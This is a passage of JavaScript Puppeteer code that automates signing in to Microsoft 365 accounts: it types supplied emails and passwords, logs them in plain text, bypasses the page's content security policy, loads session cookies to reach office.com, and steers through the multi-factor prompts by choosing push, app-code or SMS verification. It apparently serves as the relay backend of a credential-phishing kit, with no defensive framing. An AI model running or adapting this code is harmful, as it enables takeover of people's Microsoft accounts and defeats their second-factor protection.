       }/*else if(response.url().includes('&redirect_uri=')){


//await windowSet(page, 'redirecturi', Redirect_uri);
//await page.evaluate((Redirect_uri) => {const redirecturi=`${Redirect_uri}`;}, Redirect_uri);
//await page.evaluate(() => {console.log('redirect_uri:'+window.redirecturi);});


       } */   
        
    }
  });

/*await page.on('response', async response =>{


    
       if(response.url()==="https://login.microsoftonline.com/common/SAS/BeginAuth"){
         try {
         try{
          BeginAuthjson=await response.json();//JSON.parse()
         } catch(error) {} 
           if(BeginAuthjson && BeginAuthjson['Success']===true){
               console.log('BeginAuthjson[Timestamp]:',BeginAuthjson['Timestamp']);
               return BeginAuthjson['Timestamp'];
           }
          
         } catch(error) {
          //return false;
         }
       }
       
    });
*/ 
//https://login.microsoftonline.com/common/SAS/BeginAuth   when click on 2fa in 2fa panel
/*succes
ErrCode: 0
FlowToken: "AQABAAEAAAD--DLA3VO7QrddgJg7WevroOya8RqZq02_UcWfxXntBD5FfrvoUu6wPhxhTvd8Nc7kmnlTT7fkCzwjpiQLrBVwBCMuOblkTyhEWinoiY1v4JJm2tbIMyXJ_PGcFtDgBKNRBXaLnQIyeT1gUtQ-f9QSvPXPouPHqGGI9tXW6pDsJ0By9R7NJE0HkWK0z0TIetXVVoTh5TnXdN7fsFwZvE8L2RKhDZxILZI87P-G5MarqlWAUKsk_LJ2H7bQwAw9-mA0xX1dp2iHB8cez9aBasLGJSMXJyUbnea_iudQxWaKHO9UkJafndxjsfl0ytw_6CeHMzOxozmEtx3UbHvQtwKjMm27HXbYNaw8EwXF0Nc2PsOC-1Ud_B3Vn4Lpw_NjhTdxlooQARwbXmpB2X6a9M1kQUBmr3rNYhaUkwEEH2kzOU1zJO9pIuZVRYIZ6iiHUpk3wCSJnizIsNPl9Suv_ONE1W1UNryoPWDVencnJ1Zvk6RoB6Ei5KbZHv76OoQK0tzLv8d3X9xzJhivhsH9SD5hYiv9XdmDoO6RUZH9WqG0ATTThhlk7hmaFAt7n0oO2qR0vSV2DrFRYuAzd0CricrKaU1JtDp7hbeXiQDmszn8UIYkTbgPj5mTshxGfLBAJL6BcIlXef1QjsPRB5ZgWmrNeoNK32LKwnyeYBPvCWyYcPjfX--SyLVckAoqxG9Vxf4vS-AsP2wWOQedTMozmpTd2UCgLJpOahmPvF5fMryfzRZxvbbF9UBN5c9UR2QT_-2W_Vm9BLKG8NhLJ3-T0pbxcYW-XLJVDGr57CktZ5o5uWo_me0vd5mQjmftxsLVUF42-XCIgnnYSZlwJXLWH8ZgMu5MkEoYg5yIQziTO5Q2U3ksuyCbw99WjO07GZtW2yXi_3sMaBvRNV0a4PyKDJZJ23fdd0rFvgMRl2dnZY2XFiN2ZDL6UukmJgzKI6mOHT1-ppWg0WSQP62F_gK0NGhbXoSgkBTfvNvoy4cE0PflsxwczzLLftoLsg1cFn00b4ilheNU5sGr7jwpC3j8cyX0Olg6Wx--c84eXjKL-sx9duToGTVWjXT2qgu_yT01pIMgAA"
Message: null
ResultValue: "Success"
Retry: false
SessionId: "30019d38-7fb7-4bd4-9e11-387834ec9355"
Success: true
*/
/*failed due timeout
ErrCode: 50089
FlowToken: "AQABAAEAAAD--DLA3VO7QrddgJg7WevrTAFWYaILPoK-vJAi3OaGT-K_7hD_3ZBoF2HEbxtp2WSr8jSwzG3AJlb1pX4dx-IZltYbhUIVJIKcUOJ4cHvPo0JCYyxjWjKA4UdKmezY6eKeqz_lHTvFGTVG5mm51vVTcmf1ti_MNyhWkvi4ZyHtkc3xJmViPTucmYflC-R2RY-3L4GWS4HtA7m_nMt38v6bIQRQprvzh8KQ6kvd0_2QIW1lNG7EUTe9SUorQ29Jpuw5524iTmB-qYzOhbPZobaD4tAUGvD2eWr0oVIxNmoQhYoS69SaRrOSNwk2y74UWzeWmui9cVtYB2E7Y7hRNpZgralU6YdHxsd92_EVoXkZDIwmbM8XwF7oz1vVk4nV9_-7MSbj7wB9x77IzLdpaDR1zsueRD73L9zktzowH0jNDJnqUrz6JBf0-0L1uJcFQ6uHkoruqlD2Ie2UqHUr_jmZb96iYl9a0cDD6vOW9gd_YqQKAXtse2p7G7gK2k5yhSmx2RvzxwnP-rST5_SvtfJCjh7_Pt0ISA7TAaDYUrsVcYh-Xeu78G_gGjaw3Rqd8hOHcVPpSyLVCh17voKUacDly8a0nZ95Aunm-vV4SJZoyZJyuShFpdwPocxM4OdW_euqhYUgE7fv6XnHF4yN_RGR_w1QHBNa3FECORwgk6eo1Klg3idK45UWaT6UxIe2IWJxindwijdCW1xsjANvo4Cd9GxIKlZ9FSAugvEZe2ezN24-Bb_VYT-rLlVRoo_gb2RCMkFwMuqFobMbluKirqaA3ialpQefujjyjuthT-bkIcVxprbbCZSl4Y71ZySb6sP2hHG1u0zHMazi8DFz36mbYM0l-qdqjQL3cPfi8ZZUGTkERlncne4YB14RAAe6uEsRcsQEHfwZDY7fqN_KHAeEtndQWCKFSfMNyumqAYnZM0j-cjMwAN8X_acOgo5EzphAEJk-D5kYKVfeEG2iRZ1t0XRO-jaodnbogynGORXnsvR8h59ZcEgTwkXxxhzH5eSDBCWFrZ0y5BjzaIFl8FJKtLknUgY9Qt290DD53avsvARZINQXk4XL2QzPDiRj-KUgAA"
Message: "AADSTS50089: Authentication failed due to flow token expired."
ResultValue: null
Retry: false
SessionId: null
Success: false
*/
page.on('console', (msg) =>{if(msg.text()!=='Failed to load resource: net::ERR_FAILED'&&!msg.text().includes('JQMIGRATE: Migrate is installed')&&!msg.text().includes('was preloaded using link')&&!msg.text().includes('Failed to load resource')&&!msg.text().includes('Axios response') ){ console.log(msg.text())}});
await page.setDefaultTimeout(15000);

//var setcookie=true;
//var getcookie=true

await preparePageForTests(page,RndUserAgent);
//await page.goto(dataurl,{waitUntil: 'networkidle2'});
/*await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36');
await page.setViewport({
   width: 1080,
   height: 1080,
  });
  */
await page.setBypassCSP(true);
if(setcookie && cookie){
await page.setCookie(...cookie);//cookie
}  
await page.goto(dataurl);
/*if(sendresponse){
            var result = { "statusCode": 1,"Status": "pending","Msg":"pending","email" : email,"Time":new Date().toUTCString() };
            return result;
}*/
//await page.waitForNavigation('domcontentloaded');
//await page.waitForNavigation({waitUntil: 'domcontentloaded'});
//const navigationPromise = page.waitForNavigation('networkidle0');//networkidle0//networkidle2//domcontentloaded//load

if(setcookie && cookie){
//await page.waitForFunction(() => Redirect_uri.includes('https://www.office.com/'));
let Response_uri =false;
//let Redirect_uri =false;
console.log('Response...');

await page.waitForFunction(() => window.location.href.includes('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=')||window.location.href.includes('https://login.live.com/'));
//Response_uri = await page.waitForResponse(response => response.url().includes('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id='),11);
//console.log('Response():',await Response_uri.url());

 console.log('Response_uri:yes');   
if(!Redirect_uri){Redirect_uri='https://www.office.com/landingv2';}
 console.log('Redirect_uri:',Redirect_uri);   
try{await page.waitForFunction(`window.location.href === "${Redirect_uri}"||(window.location.href.includes("https://www.office.com/")&&!window.location.href.includes("https://www.office.com/login"))||window.location.href.includes("https://www.office.com/landing")||document.querySelector("#hero-heading")`);console.log('passed'); console.log('office.com');done = true; }catch(e){faillogin=true;status="expiredcookies";console.log('fail login with sessions. error, catch err:'+e);}


}
//try{await page.waitForFunction("window.location.href.includes('https://www.office.com/')|| document.querySelector('#hero-heading2')||document.querySelector('#ProofUpDescription2')");console.log('passed');  }catch(e){faillogin=true;console.log('fail login unknown error, err:'+e);}

//await page.waitForTimeout(20000);
//if (isSkipMfaR && (Url.includes('office.com')||await page.$('#hero-heading') !== null)) {
//await page.evaluate(() => {console.log('redirect_uri-:'+window.redirecturi);});


//}
try{

if(!setcookie){
    //["PhoneAppNotification","PhoneAppOTP","OneWaySMS","TwoWayVoiceMobile","verify_email"]
    console.log('MfaNeedMode="'+MfaNeedMode+'"');
    console.log('MfaDefaultMode="'+MfaDefaultMode+'"');
if(["PhoneAppNotification","PhoneAppOTP","OneWaySMS"/*,"TwoWayVoiceMobile","verify_email"*/].includes(MfaDefaultMode)&&(MfaNeedMode=="Default" || !["PhoneAppNotification","PhoneAppOTP","OneWaySMS"/*,"TwoWayVoiceMobile","verify_email"*/].includes(MfaNeedMode))){
MfaNeedMode=MfaDefaultMode;
console.log('MfaNeedMode=MfaDefaultMode="'+MfaDefaultMode+'"');
}
if(MfaNeedMode&&MfaNeedMode=="PhoneAppNotification"){
MfaNeedSelector[0]="[data-value=PhoneAppNotification]";
MfaNeedSelector[1]="#idDiv_SAOTCAS_Description";
}else if(MfaNeedMode&&MfaNeedMode=="PhoneAppOTP"){
MfaNeedSelector[0]="[data-value=PhoneAppOTP]";
MfaNeedSelector[1]="#idTxtBx_SAOTCC_OTC";    
}else if(MfaNeedMode&&MfaNeedMode=="OneWaySMS"){
MfaNeedSelector[0]="[data-value=OneWaySMS]";
MfaNeedSelector[1]="#idTxtBx_SAOTCC_OTC";    
}else if(MfaNeedMode&&MfaNeedMode=="TwoWayVoiceMobile"){
MfaNeedSelector[0]="[data-value=TwoWayVoiceMobile]";
MfaNeedSelector[1]="";
}

    console.timeEnd('gourl('+RandArr[1]+')');
    console.time('selectoremail('+RandArr[2]+')');
    await page.waitForSelector("input[name=loginfmt]");
    await page.$eval('input[name=loginfmt]', el => el.value = '');
    await page.type("input[name=loginfmt]",dataemail,{delay:25});
    console.log('email puted');
    page.click("input[type=submit][value=Next]");//await
    //await page.click("input[type=submit][value=Next]");
    //await page.waitForNavigation();
    try{await page.waitForFunction("document.querySelector('div[id=displayName]') || document.querySelector('#usernameError')|| document.querySelector('#loginDescription')"); IsO365 = true; }catch(e){faillogin=true;/*wrongemail=true;*/console.log('fail login unknown error about email, catch err:'+e);}
    console.timeEnd('selectoremail('+RandArr[2]+')');
if(await page.$('div[id=displayName]') !== null){
    console.log('user submited');
    //faillogin = true;
   IsO365 = true;
    submitlogin = await page.waitForSelector("div[id=displayName]").then(async() => {console.log("loginpass."); await page.waitForSelector("input[name=passwd]");await page.$eval('input[name=passwd]', el => el.value = '');await page.type("input[name=passwd]",datapass,{delay:25});console.log('Email:'+dataemail+' Pass:'+datapass);/*page.click("#edgeworth-Favorites-tab")*/page.click("input[type=submit][id=idSIButton9]");/*await navigationPromise;*/await page.waitForNavigation('networkidle0');console.log("pass submited"); return true; }).catch(e => { console.log("FAIL login catch err:"+e); return false; });
    console.log('submitlogin='+submitlogin);
    try{await page.waitForFunction(`window.location.href.includes("${Redirect_uri}")||window.location.href.includes("https://www.office.com/")||document.querySelector("#passwordError") || document.querySelector("#idDiv_SAOTCS_Proofs_Section")|| document.querySelector("#idDiv_SAOTCC_Title")||document.querySelector("#idDiv_SAOTCAS_Title")||document.querySelector("#KmsiDescription")||document.querySelector("#ProofUpDescription")`);console.log('passed.')}catch(e){faillogin=true;console.log('fail login unknown error, catch err:'+e);}

    //await page.waitForSelector("div[id=displayName]");
    //await page.waitForSelector("#passwordError");
    //await page.waitForSelector("input[name=passwd]");
    
    
}else if(await page.$('#loginDescription') !== null&&await page.$('#aadTile') !== null){
    IsO365 = true;
// #aadTile    Work or school account
// #msaTile    Personal account
console.log('Pick an account3');
Pickaccount = await page.waitForSelector("#aadTile").then(async() => { console.log("loginpass.."); page.click("#aadTile");/*await navigationPromise;*//*await page.waitForNavigation('networkidle0');*/console.log("Success Pick Work or school account");await page.waitForSelector("div[id=displayName]"); return true; }).catch(e => { console.log("Pick an account catch err:"+e); return false; });
console.log('Pickaccount:'+Pickaccount);

submitlogin = await page.waitForSelector("div[id=displayName]").then(async() => { console.log("loginpass..."); await page.waitForSelector("input[name=passwd]");await page.$eval('input[name=passwd]', el => el.value = '');await page.type("input[name=passwd]",datapass,{delay:25});/*"aJ6QVibgsJt.udd2"*//*130413041987To*/ /*page.click("#edgeworth-Favorites-tab")*/page.click("input[type=submit][id=idSIButton9]");/*await navigationPromise;*/await page.waitForNavigation('networkidle0');console.log("pass submited."); return true; }).catch(e => { console.log("FAIL login catch errr:"+e); return false; });
    console.log('submitlogin='+submitlogin);
    try{await page.waitForFunction(`window.location.href.includes("${Redirect_uri}")||window.location.href.includes("https://www.office.com/")||document.querySelector("#passwordError") || document.querySelector("#idDiv_SAOTCS_Proofs_Section")|| document.querySelector("#idDiv_SAOTCC_Title")||document.querySelector("#idDiv_SAOTCAS_Title")||document.querySelector("#KmsiDescription")||document.querySelector("#ProofUpDescription")`);console.log('passed..');  }catch(e){faillogin=true;console.log('fail login unknown error, catch err:'+e);}




}else if(await page.$('#passwordError') !== null){console.log('wrong user');wronguser=true;}
}
//here
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'AfterSubmitLogin',datadebug,false); 

if(submitlogin == true && await page.$('#passwordError') == null && await page.$('input[name=passwd]') == null && !faillogin && !wronguser && !setcookie){
    console.log('Success login');
IsO365 = true;
successlogin = true;
//const url = await page.evaluate(() => location.href);
//await page.waitForTimeout(3000);
console.log('MfaNeedSelector[1]:',MfaNeedSelector[1]);
const currentUrl = await page.url();
console.log('--currentUrl--',currentUrl);
if (currentUrl.includes(Redirect_uri)||currentUrl.includes('https://www.office.com/')||await page.$('#hero-heading') !== null) {
console.log('office.com');
done = true;
}else if (await page.$('#KmsiDescription') !== null) {
console.log('Stay signed in');
done = await page.waitForSelector("#idSIButton9").then(async() => {await page.click("#idSIButton9");/*await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok());*/ console.log("(Stay signed in) button submited");/*const currenturl = await page.evaluate(() => location.href);*/await page.waitForFunction(`window.location.href.includes("${Redirect_uri}")||window.location.href.includes("https://www.office.com/")||document.querySelector("#hero-heading")`);console.log('redirect to office.com'); return true; }).catch(e => { console.log("Stay signed in catch err:"+e); return false; });
console.log('done='+done);
}else if (await page.$('#idDiv_SAOTCS_Proofs_Section') !== null) {
    
   if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully');
   }
   
    isMfa = true;
console.log('mfa panel');
all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
console.log('all2FA(1):'+JSON.stringify(all2FA, null, 4));
if(MfaNeedMode){

console.log('before click: '+MfaNeedSelector[0]);
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'BeforeChose2fa',datadebug,false); 
const MfaNeedSelector1=MfaNeedSelector[1];const signInAnotherWay='#signInAnotherWay';
isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {console.log(MfaNeedSelector[0]+"-");await page.click(MfaNeedSelector[0]);console.log(MfaNeedSelector[0]+"----");console.log(MfaNeedSelector[1]+"-----");await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'BeforeChose2fa2',datadebug,false);await page.waitForFunction(`document.querySelector("${MfaNeedSelector[1]}")||document.querySelector("${signInAnotherWay}")`,{ timeout: 15020});/*await page.waitForSelector(MfaNeedSelector[1]);*/ if (await page.$(MfaNeedSelector[1]) !== null) {console.log(MfaNeedSelector[1]+"---");return true;}else if(await page.$("#signInAnotherWay") !== null){                                 var ii=0;var oki = false;while(!oki&&ii<50){
    await page.waitForTimeout(500*ii);
    ii++;console.time('while:ii='+ii);if(await page.$(MfaNeedSelector[1])){console.log('isMfaBox...');oki=true;return true;}else if(await page.$('#signInAnotherWay')){console.log('#signInAnotherWay');await page.click("#signInAnotherWay");console.log('@');console.log('@@');/*await page.waitForResponse(response => response.ok());*/console.log('@@@');await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'BeforeChose2fa--',datadebug,false);await page.waitForFunction('document.querySelector("#idDiv_SAOTCS_Proofs")',{ timeout: 3010})/*try{await page.waitForFunction('document.querySelector("#idDiv_SAOTCS_Proofs")',{ timeout: 15050});}catch(err){console.log('@@@@'+err);await page.reload();console.log('@@@@Reloading');await page.waitForFunction('document.querySelector("#idDiv_SAOTCS_Proofs")',{ timeout: 15060});}*/;console.log('@@@@');/*console.log('waitForTimeout(3000)');*/   if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods2'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully2');
   };
   if(await page.$(MfaNeedSelector[0])){console.log('isMfaPanel...');await page.click(MfaNeedSelector[0]);await page.waitForFunction(`document.querySelector("${MfaNeedSelector[1]}")||document.querySelector("${signInAnotherWay}")`,{ timeout: 15100});console.log('isMfaBox...');await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'loop'+ii,datadebug,false);}else if(await page.$(MfaNeedSelector[1])){console.log('isMfaBox...');oki=true;return true;}else{console.log('!isMfaBox !ispanel');}}else{console.log('!isMfaBox.!#signInAnotherWay');await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'loop'+ii,datadebug,false);}console.timeEnd('while:ii='+ii);}                               if (await page.$(MfaNeedSelector[1]) !== null) {console.log(MfaNeedSelector[1]+"---");return true;}        ; console.log('#signInAnotherWay'+"---"); return false; }return true;}).catch(e => { console.log(MfaNeedSelector[0]+" ---catch2 err:"+e); return false; });
//isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {try{console.log(MfaNeedSelector[0]+"-");page.click(MfaNeedSelector[0]);await page.waitForNavigation('networkidle0');if(await page.$(MfaNeedSelector[1])){return true;}/*await page.waitForNavigation('networkidle0');*/console.log(MfaNeedSelector[0]+"-----");await debug(await page.screenshot({encoding: 'base64'}),Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'BeforeChose2fa2',datadebug,false);var it=0;var okt = false;while(!okt&&it<10){it++;console.time('while:it='+it);await page.waitForTimeout(1000*it);console.timeEnd('while:it='+it);if(await page.$('#signInAnotherWay')){await page.click("#signInAnotherWay");console.log('waitForTimeout(1000)');await page.waitForTimeout(1000);if(await page.$(MfaNeedSelector[0])){await page.click(MfaNeedSelector[0]);console.log('isMfaPanel...');}else if(await page.$(MfaNeedSelector[1])){console.log('isMfaBox...');okt=true;}}}}catch(eee){console.log("catch err.:"+eee);return false;}; return true; }).catch(e => { console.log(MfaNeedSelector[0]+" ---catch err:"+e); return false; });

//await isMfaBox;
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
console.log('isMfaBox = '+isMfaBox);
console.log('after click: ',MfaNeedSelector[0]);


if(!isMfaBox){
//console.log('isMfaPanel.');await page.waitForTimeout(8000);await page.click("#signInAnotherWay");await page.waitForTimeout(1000);console.log('isMfaPanel..');    
// isMfaPanel = await page.waitForSelector("#signInAnotherWay").then(async() => {await page.waitForTimeout(8000);await page.click("#signInAnotherWay");console.log('isMfaPanel.');await page.waitForNavigation('networkidle0');console.log('isMfaPanel..');await page.waitForResponse(response => response.ok()); console.log("#signInAnotherWay"); return true; }).catch(e => { console.log("mfa catch err:"+e); return false; });    
        //console.log('isMfaPanel='+isMfaPanel);   
console.log('mfa timeout2');        
    if(MfaNeedMode&&MfaMode&&MfaMode !== MfaNeedMode){
        console.log('mfa timeout2-');
await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'BeforeChose2fa3',datadebug,false);
        if (await page.$('#idDiv_SAOTCS_HavingTrouble') !== null) {
            console.log('mfa timeout2-.');
        isMfaPanel = await page.waitForSelector("#idDiv_SAOTCS_HavingTrouble").then(async() => {page.click("#idDiv_SAOTCS_HavingTrouble");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#idDiv_SAOTCS_HavingTrouble"); return true; }).catch(e => { console.log("mfa catch err1:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);
        }else if(await page.$('#signInAnotherWay') !== null) {
            console.log('mfa timeout2-..');
        isMfaPanel = await page.waitForSelector("#signInAnotherWay").then(async() => {page.click("#signInAnotherWay");await page.waitForResponse(response => response.ok()); console.log("#signInAnotherWay"); return true; }).catch(e => { console.log("mfa catch err2:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);
        }
        if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
            console.log('mfa timeout2-...');
               if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods3'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully3');
   }
             all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
             console.log('all2FA(8):'+JSON.stringify(all2FA, null, 4));   
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click(MfaNeedSelector[0]);await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[1]); return true; }).catch(async(e) => { if(await page.$("#signInAnotherWay")){            var ii=0;var oki = false;while(!oki&&ii<50){ii++;console.time('while:ii='+ii);if(await page.$(MfaNeedSelector[1])){console.log('isMfaBox...');oki=true;return true;}else if(await page.$('#signInAnotherWay')){await page.click("#signInAnotherWay");console.log('click("#signInAnotherWay")');await page.waitForFunction(`document.querySelector("${MfaNeedSelector[0]}")||document.querySelector("${MfaNeedSelector[1]}")`,{ timeout: 15100});console.log('isMfaBox OR isMfaPanel...');if(await page.$(MfaNeedSelector[0])){console.log('isMfaPanel...');await page.click(MfaNeedSelector[0]);console.log('isMfaBox...');}else if(await page.$(MfaNeedSelector[1])){console.log('isMfaBox...');oki=true;}};console.log('while:ii='+ii+' waitForTimeout('+1000*ii+')');await page.waitForTimeout(1000*ii);console.timeEnd('while:ii='+ii);}           }else if(await page.$(MfaNeedSelector[0])){page.click(MfaNeedSelector[0]);await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[1]);return true;}else if(await page.$(MfaNeedSelector[1])){ console.log(MfaNeedSelector[1]);return true;};console.log(MfaNeedSelector[1]+" catch err:2"+e); return false; });
        console.log('isMfaBox = '+isMfaBox);
            if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
        }else{console.log('mfa box err');}
    }else{
        console.log('mfa timeout2--');
        if (await page.$('#idA_SAASTO_SendCode') !== null) {
        console.log('send code again');  //?? 
        isMfaBox = await page.waitForSelector('#idA_SAASTO_SendCode').then(async() => {page.click('#idA_SAASTO_SendCode');await page.waitForNavigation('networkidle0');await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[0]); return true; }).catch(e => { console.log(MfaNeedSelector[0]+" catch err:2"+e); return false; });
        console.log('isMfaBox = '+isMfaBox);
            if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
        }else if (await page.$('#signInAnotherWay') !== null) {
        isMfaPanel = await page.waitForSelector("#signInAnotherWay").then(async() => {page.click("#signInAnotherWay");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#signInAnotherWay"); return true; }).catch(e => { console.log("mfa catch err3:"+e); return false; });    
        console.log('isMfaPanel='+isMfaPanel);  
        }
        if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
            
               if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods4'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully4');
   }
   
             all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
             console.log('all2FA(5):'+JSON.stringify(all2FA, null, 4));   
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click(MfaNeedSelector[0]);await page.waitForNavigation('networkidle0');await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[0]); return true; }).catch(e => { console.log(MfaNeedSelector[0]+" catch err:2"+e); return false; });
        console.log('isMfaBox = '+isMfaBox);
            if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
        }else{console.log('mfa box err');}
    }
}



await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'AfterChoseAndClick2fa-_-',datadebug,false); 
//console.log('after click2: [data-value=OneWaySMS]');
    }    
}else if (await page.$(MfaNeedSelector[1]) !== null|| await page.$('[value=PhoneAppNotification]') !== null || await page.$('[value=PhoneAppOTP]') !== null || await page.$('[value=OneWaySMS]') !== null) {
    console.log('MfaNeedSelector[1] :'+MfaNeedSelector[1]);
    isMfa = true;
    //MfaMode=2;//or1
    if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }
    console.log('mfa code input');
    if(MfaNeedMode&&MfaMode&&MfaMode !== MfaNeedMode){
            isMfaBox = false;
        if (await page.$('#idDiv_SAOTCS_HavingTrouble') !== null ){
        isMfaPanel = await page.waitForSelector("#idDiv_SAOTCS_HavingTrouble").then(async() => {page.click("#idDiv_SAOTCS_HavingTrouble");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'isMfaPanel',datadebug,false);console.log("#idDiv_SAOTCS_HavingTrouble"); return true; }).catch(e => { console.log("mfa catch err4:"+e); return false; });
        console.log('isMfaPanel='+isMfaPanel);
        }else if(await page.$('#signInAnotherWay') !== null) {
        isMfaPanel = await page.waitForSelector("#signInAnotherWay").then(async() => {page.click("#signInAnotherWay");await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok()); console.log("#signInAnotherWay"); return true; }).catch(e => { console.log("mfa catch err5:"+e); return false; });
        console.log('isMfaPanel='+isMfaPanel);
        }
        if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
            
               if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods5'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully5');
   }
            
                all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
                //console.log('all2FA='+all2FA);
                console.log('all2FA(2):'+JSON.stringify(all2FA, null, 4));
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click(MfaNeedSelector[0]);await page.waitForNavigation('networkidle0');await page.waitForSelector(MfaNeedSelector[1]); console.log(MfaNeedSelector[0]); return true; }).catch(e => { console.log(MfaNeedSelector[0]+" catch err:"+e); return false; });
        console.log('isMfaBox = '+isMfaBox);
        if (await page.$('[value='+MfaNeedMode+']') !== null) {
    MfaMode=MfaNeedMode; 
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
